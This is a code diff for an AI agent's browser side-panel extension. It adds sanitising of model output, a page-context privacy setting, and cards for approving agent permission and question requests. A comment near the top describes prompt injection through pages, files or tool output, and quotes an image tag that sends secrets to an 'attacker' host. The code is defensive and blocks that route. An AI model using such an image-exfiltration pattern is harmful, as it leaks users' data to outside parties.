@@ -1,4 +1,29 @@
 I18N.ready.then(function() {
+  // 모델 응답은 신뢰할 수 없는 입력이다(페이지 내용·파일·도구 출력에 심어진 프롬프트 인젝션).
+  // marked는 원문 HTML을 그대로 통과시키므로 반드시 DOMPurify로 정화한다.
+  //  - 원격 이미지는 불러오지 않고 링크로 바꾼다: <img src="https://attacker/?d=비밀">로
+  //    사용자 동작 없이 데이터를 내보내는 경로를 막는다(manifest CSP img-src도 같이 막음).
+  //  - 링크는 http(s)/mailto만 남기고 새 탭으로 연다(사이드패널 자체가 이동하지 않게).
+  const MD_SANITIZE_CONFIG = {
+    FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select', 'option',
+      'iframe', 'frame', 'frameset', 'object', 'embed', 'base', 'link', 'meta', 'svg', 'math', 'video', 'audio', 'source'],
+    FORBID_ATTR: ['style', 'srcset', 'action', 'formaction', 'ping'],
+  };
+  if (typeof DOMPurify !== 'undefined') {
+    DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+      if (node.tagName === 'A') {
+        const href = node.getAttribute('href') || '';
+        if (/^(https?:|mailto:)/i.test(href)) {
+          node.setAttribute('target', '_blank');
+          node.setAttribute('rel', 'noopener noreferrer');
+          node.setAttribute('title', href);
+        } else {
+          node.removeAttribute('href');
+        }
+      }
+    });
+  }
+
   const messagesContainer = document.getElementById('messages-container');
   const messageInput = document.getElementById('message-input');
   const sendBtn = document.getElementById('send-btn');
@@ -217,6 +242,10 @@ I18N.ready.then(function() {
           if (tab.title) addPageContextMessage(tab.title, tab.url);
         } else {
           await loadAndRenderHistory(result.sessionId, tab);
+          // 화면을 다시 그리면서 사라진 권한/질문 카드를 복원한다(응답이 없으면 서버가 계속 대기).
+          if (tab.id === currentTabId && currentSessionId === result.sessionId) {
+            await restorePendingInteractions(result.sessionId);
+          }
         }
       }
     } catch (e) {
@@ -972,7 +1001,7 @@ I18N.ready.then(function() {
     const contentDiv = document.createElement('div');
     contentDiv.className = 'message-content markdown-body';
     contentDiv.dataset.raw = content;
-    contentDiv.innerHTML = typeof marked !== 'undefined' ? marked.parse(content) : escapeHtml(content);
+    contentDiv.innerHTML = renderMarkdown(content);
     messageDiv.appendChild(avatar);
     messageDiv.appendChild(contentDiv);
     messagesContainer.appendChild(messageDiv);
@@ -1370,6 +1399,8 @@ I18N.ready.then(function() {
   }
 
   // ---- 설정(⚙) 드롭다운: 실행 환경(WSL/Windows) 선택 + 서버 강제 재시작 ----
+  // '본문·선택 텍스트' 모드에서 탭 내용을 읽기 위한 선택적 호스트 권한(manifest optional_host_permissions)
+  const PAGE_ACCESS_ORIGINS = ['<all_urls>'];
   const RUNTIME_LABELS = { get auto() { return t('자동'); }, wsl: 'WSL', windows: 'Windows' };
 
   // 정보 섹션 상태: 패널을 여는 동안 유지한다.
@@ -1517,6 +1548,13 @@ I18N.ready.then(function() {
       };
     }
     const proxy = proxyDraft || proxyCache;
+    let pageContextMode = 'basic';
+    let pageAccessGranted = false;
+    try {
+      const { pageContext } = await chrome.storage.local.get('pageContext');
+      if (['off', 'basic', 'full'].includes(pageContext)) pageContextMode = pageContext;
+      pageAccessGranted = await chrome.permissions.contains({ origins: PAGE_ACCESS_ORIGINS });
+    } catch {}
     settingsServerPort = info.port || null;
     const pref = info.preferredRuntime || 'auto';
     const currentRuntime = info.serverIsWSL === true ? 'wsl' : info.serverIsWSL === false ? 'windows' : null;
@@ -1541,6 +1579,20 @@ I18N.ready.then(function() {
             <option value="en"${I18N.getLang() === 'en' ? ' selected' : ''}>English</option>
           </select>
         </label>
+      </div>
+      <div class="settings-section">
+        <label class="settings-row">
+          <span class="settings-title">${t('페이지 컨텍스트')}</span>
+          <select id="page-context-select" class="settings-select">
+            <option value="off"${pageContextMode === 'off' ? ' selected' : ''}>${t('보내지 않음')}</option>
+            <option value="basic"${pageContextMode === 'basic' ? ' selected' : ''}>${t('제목·URL')}</option>
+            <option value="full"${pageContextMode === 'full' ? ' selected' : ''}>${t('제목·URL·본문·선택 텍스트')}</option>
+          </select>
+        </label>
+        <div class="settings-current">${t('메시지를 보낼 때 현재 탭 정보를 함께 보냅니다. 이 정보는 OpenCode를 거쳐 설정한 AI 제공자에게 전달됩니다.')}</div>
+        ${pageContextMode === 'full' && !pageAccessGranted
+          ? `<div class="settings-current warn">${t('⚠ 페이지 읽기 권한이 없어 제목·URL만 보냅니다. 다시 선택하면 권한을 요청합니다.')}</div>`
+          : ''}
       </div>
       <div class="settings-section">
         <label class="settings-row">
@@ -1596,6 +1648,20 @@ I18N.ready.then(function() {
     document.getElementById('lang-select')?.addEventListener('change', (e) => {
       I18N.setLang(e.target.value);
       onLanguageChanged();
+    });
+
+    document.getElementById('page-context-select')?.addEventListener('change', (e) => {
+      const next = e.target.value;
+      // permissions.request는 사용자 제스처 안에서 await 전에 호출해야 한다.
+      const granted = next === 'full'
+        ? chrome.permissions.request({ origins: PAGE_ACCESS_ORIGINS }).catch(() => false)
+        : Promise.resolve(true);
+      granted.then(async (ok) => {
+        const value = next === 'full' && !ok ? 'basic' : next;
+        try { await chrome.storage.local.set({ pageContext: value }); } catch {}
+        if (next === 'full' && !ok) setMcpActionStatus(t('페이지 읽기 권한이 허용되지 않아 제목·URL만 보냅니다.'), 'error');
+        renderSettingsDropdown();
+      });
     });
 
     document.getElementById('proxy-details')?.addEventListener('toggle', (e) => { proxyOpen = e.target.open; });
@@ -1789,6 +1855,28 @@ I18N.ready.then(function() {
 
   function scrollToBottom() {
     messagesContainer.scrollTop = messagesContainer.scrollHeight;
+  }
+
+  function renderMarkdown(raw) {
+    const text = raw || '';
+    if (typeof marked === 'undefined' || typeof DOMPurify === 'undefined') return escapeHtml(text).replace(/\n/g, '<br>');
+    const frag = DOMPurify.sanitize(marked.parse(text), { ...MD_SANITIZE_CONFIG, RETURN_DOM_FRAGMENT: true });
+    for (const img of frag.querySelectorAll('img')) {
+      const src = img.getAttribute('src') || '';
+      if (/^data:image\//i.test(src)) continue;
+      const a = document.createElement('a');
+      a.textContent = `🖼 ${img.getAttribute('alt') || src}`;
+      if (/^https?:/i.test(src)) {
+        a.href = src;
+        a.target = '_blank';
+        a.rel = 'noopener noreferrer';
+        a.title = src;
+      }
+      img.replaceWith(a);
+    }
+    const box = document.createElement('div');
+    box.appendChild(frag);
+    return box.innerHTML;
   }
 
   function escapeHtml(text) {
@@ -1997,6 +2085,197 @@ I18N.ready.then(function() {
     cancelFrame: (id) => cancelAnimationFrame(id),
   });
 
+  // ============================================
+  // 권한/질문 요청 카드 (opencode permission.asked / question.asked)
+  // 응답하지 않으면 서버가 계속 대기하므로 반드시 사용자에게 보여야 한다.
+  // 서버가 준 문자열은 모두 textContent로만 넣는다.
+  // ============================================
+  const interactionCards = new Map(); // requestId -> { el, resolved }
+
+  function handleInteractionPart(part) {
+    if (part.kind === 'interaction-resolved') {
+      markInteractionResolved(part.id, part.reply);
+      return;
+    }
+    const existing = interactionCards.get(part.id);
+    // 탭 전환·히스토리 재렌더로 messagesContainer가 비워지면 카드 DOM이 떨어져 나간다 → 다시 그린다.
+    if (existing && document.body.contains(existing.el)) return;
+    const card = part.kind === 'permission' ? buildPermissionCard(part) : buildQuestionCard(part);
+    interactionCards.set(part.id, { el: card, resolved: false });
+    messagesContainer.appendChild(card);
+    scrollToBottom();
+  }
+
+  function interactionCardShell(title, subtitle) {
+    const el = document.createElement('div');
+    el.className = 'interaction-card';
+    const head = document.createElement('div');
+    head.className = 'interaction-title';
+    head.textContent = title;
+    el.appendChild(head);
+    if (subtitle) {
+      const sub = document.createElement('div');
+      sub.className = 'interaction-sub';
+      sub.textContent = subtitle;
+      el.appendChild(sub);
+    }
+    const status = document.createElement('div');
+    status.className = 'interaction-status hidden';
+    el._status = status;
+    return el;
+  }
+
+  function setInteractionStatus(el, text, kind) {
+    el._status.textContent = text;
+    el._status.className = `interaction-status ${kind || ''}`;
+  }
+
+  function disableInteraction(el) {
+    el.querySelectorAll('button, input').forEach((b) => { b.disabled = true; });
+  }
+
+  async function sendInteraction(el, action, data) {
+    disableInteraction(el);
+    setInteractionStatus(el, t('전송 중…'));
+    try {
+      await sendMessageToBackground(action, { sessionId: currentSessionId, ...data });
+      setInteractionStatus(el, t('응답을 보냈습니다.'), 'ok');
+    } catch (e) {
+      setInteractionStatus(el, t('실패: {error}', { error: t(e.message) }), 'error');
+      el.querySelectorAll('button, input').forEach((b) => { b.disabled = false; });
+    }
+  }
+
+  function buildPermissionCard(part) {
+    const el = interactionCardShell(
+      t('🔐 권한 요청: {permission}', { permission: part.permission || '?' }),
+      part.fromSubagent ? t('하위 에이전트의 요청입니다.') : ''
+    );
+    if (part.patterns?.length) {
+      const pre = document.createElement('pre');
+      pre.className = 'interaction-detail';
+      pre.textContent = part.patterns.join('\n');
+      el.appendChild(pre);
+    }
+    const buttons = document.createElement('div');
+    buttons.className = 'interaction-buttons';
+    const mk = (label, reply, cls, title) => {
+      const b = document.createElement('button');
+      b.className = `mcp-action-btn ${cls || ''}`;
+      b.textContent = label;
+      if (title) b.title = title;
+      b.addEventListener('click', () => sendInteraction(el, 'reply-permission', {
+        requestId: part.id, requestSessionId: part.sessionID, reply
+      }));
+      buttons.appendChild(b);
+    };
+    mk(t('한 번 허용'), 'once');
+    mk(t('항상 허용'), 'always', '', part.always?.length ? part.always.join('\n') : '');
+    mk(t('거부'), 'reject', 'danger');
+    el.appendChild(buttons);
+    el.appendChild(el._status);
+    return el;
+  }
+
+  function buildQuestionCard(part) {
+    const el = interactionCardShell(t('❓ 에이전트의 질문'), part.fromSubagent ? t('하위 에이전트의 요청입니다.') : '');
+    const readers = []; // 질문별 선택값을 읽는 함수
+    (part.questions || []).forEach((q, qi) => {
+      const box = document.createElement('div');
+      box.className = 'interaction-question';
+      const qt = document.createElement('div');
+      qt.className = 'interaction-q-text';
+      qt.textContent = q.header ? `${q.header} — ${q.question || ''}` : (q.question || '');
+      box.appendChild(qt);
+      const name = `q-${part.id}-${qi}`;
+      const inputs = [];
+      for (const opt of (q.options || [])) {
+        const label = document.createElement('label');
+        label.className = 'interaction-option';
+        const input = document.createElement('input');
+        input.type = q.multiple ? 'checkbox' : 'radio';
+        input.name = name;
+        input.value = opt.label;
+        label.appendChild(input);
+        const span = document.createElement('span');
+        span.textContent = opt.description ? `${opt.label} — ${opt.description}` : opt.label;
+        label.appendChild(span);
+        box.appendChild(label);
+        inputs.push(input);
+      }
+      let custom = null;
+      if (q.custom !== false) {
+        custom = document.createElement('input');
+        custom.type = 'text';
+        custom.className = 'interaction-custom';
+        custom.placeholder = t('직접 입력 (선택)');
+        box.appendChild(custom);
+      }
+      readers.push(() => {
+        const picked = inputs.filter(i => i.checked).map(i => i.value);
+        const typed = custom?.value.trim();
+        if (typed) picked.push(typed);
+        return picked;
+      });
+      el.appendChild(box);
+    });
+    const buttons = document.createElement('div');
+    buttons.className = 'interaction-buttons';
+    const send = document.createElement('button');
+    send.className = 'mcp-action-btn';
+    send.textContent = t('답변 보내기');
+    send.addEventListener('click', () => {
+      const answers = readers.map(r => r());
+      if (answers.some(a => a.length === 0)) {
+        setInteractionStatus(el, t('모든 질문에 답해 주세요.'), 'error');
+        return;
+      }
+      sendInteraction(el, 'reply-question', { requestId: part.id, answers });
+    });
+    const skip = document.createElement('button');
+    skip.className = 'mcp-action-btn danger';
+    skip.textContent = t('건너뛰기');
+    skip.addEventListener('click', () => sendInteraction(el, 'reject-question', { requestId: part.id }));
+    buttons.appendChild(send);
+    buttons.appendChild(skip);
+    el.appendChild(buttons);
+    el.appendChild(el._status);
+    return el;
+  }
+
+  async function restorePendingInteractions(sessionId) {
+    try {
+      const res = await sendMessageToBackground('get-pending-interactions', { sessionId });
+      if (sessionId !== currentSessionId) return;
+      for (const part of res.items || []) handleInteractionPart(part);
+    } catch (e) {
+      console.warn('대기 중인 권한/질문 요청 복원 실패:', e.message);
+    }
+  }
+
+  function markInteractionResolved(id, reply) {
+    const entry = interactionCards.get(id);
+    if (!entry || entry.resolved) return;
+    entry.resolved = true;
+    disableInteraction(entry.el);
+    entry.el.classList.add('resolved');
+    const text = reply === 'reject' ? t('거부됨') : reply === 'always' ? t('항상 허용됨') : reply === 'once' ? t('허용됨') : t('응답 완료');
+    setInteractionStatus(entry.el, text, reply === 'reject' ? 'error' : 'ok');
+  }
+
+  // 응답이 끝나면(완료·오류·중단) 남은 카드는 더 이상 유효하지 않다.
+  function expirePendingInteractions() {
+    for (const [id, entry] of interactionCards) {
+      if (!entry.resolved) {
+        entry.resolved = true;
+        disableInteraction(entry.el);
+        entry.el.classList.add('resolved');
+        setInteractionStatus(entry.el, t('요청이 만료되었습니다.'));
+      }
+      interactionCards.delete(id);
+    }
+  }
+
   function ensureActiveBlockMessage() {
     // 탭 전환/세션 초기화 등으로 messagesContainer가 통째로 비워지는 지점이 여러 곳
     // (reinitForTab, /clear, loadAndRenderHistory 등) 있어 매번 거기서 참조를 리셋하는
@@ -2103,9 +2382,7 @@ I18N.ready.then(function() {
     if (block.type === 'text') {
       if (el.dataset.raw === block.raw) return; // 원문 불변 시 재파싱 생략 (O(n^2) 방지)
       el.dataset.raw = block.raw;
-      el.innerHTML = typeof marked !== 'undefined'
-        ? marked.parse(block.raw)
-        : escapeHtml(block.raw);
+      el.innerHTML = renderMarkdown(block.raw);
       return;
     }
     if (block.type === 'tool') {
@@ -2198,6 +2475,9 @@ I18N.ready.then(function() {
       ensureActiveBlockMessage();
       appendTextDelta(activeBlocks, message.chunk);
       blockRenderScheduler.request();
+    } else if (message.action === 'message-part' && message.sessionId === currentSessionId
+               && ['permission', 'question', 'interaction-resolved'].includes(message.part?.kind)) {
+      handleInteractionPart(message.part);
     } else if (message.action === 'message-part' && message.sessionId === currentSessionId) {
       ensureActiveBlockMessage();
       const part = message.part || {};
@@ -2220,6 +2500,7 @@ I18N.ready.then(function() {
       }
       setLoadingState(false);
       blockRenderScheduler.flush(); // pending 프레임을 즉시 반영해 마지막 delta 누락 방지
+      expirePendingInteractions();
 
       if (message.error) {
         // 진행 중이던 tool/reasoning 카드를 지우지 않고 'error'로 고정해 남긴다
